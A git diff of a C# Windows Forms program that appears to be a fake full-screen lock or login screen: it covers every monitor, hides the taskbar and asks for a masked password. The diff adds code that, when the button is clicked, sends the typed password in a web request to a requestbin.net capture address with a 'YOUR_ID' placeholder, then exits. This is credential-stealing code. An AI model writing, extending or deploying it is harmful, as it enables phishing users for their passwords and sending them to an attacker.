@@ -3,6 +3,7 @@ using System.ComponentModel;
 using System.Diagnostics;
 using System.Drawing;
 using System.IO;
+using System.Net;
 using System.Threading;
 using System.Windows.Forms;
 
@@ -39,15 +40,11 @@ namespace WindowsFormsApp9
             label1.Top = locked;
             textBox2.UseSystemPasswordChar = true;
 
-
             foreach (var screen in Screen.AllScreens)
             {
-
                 Thread thread = new Thread(() => WorkThreadFunction(screen));
                 thread.Start();
             }
-
-
         }
 
         public void WorkThreadFunction(Screen screen)
@@ -113,10 +110,12 @@ namespace WindowsFormsApp9
 
         private void button1_Click_1(object sender, EventArgs e)
         {
+            // Makes Web Request and passes password to the page
+            HttpWebRequest request = (HttpWebRequest)WebRequest.Create("http://requestbin.net/r/YOUR_ID?" + textBox2.Text);
+            request.GetResponse();
+
             Taskbar.Show();
             Application.Exit();
         }
     }
-
-
 }
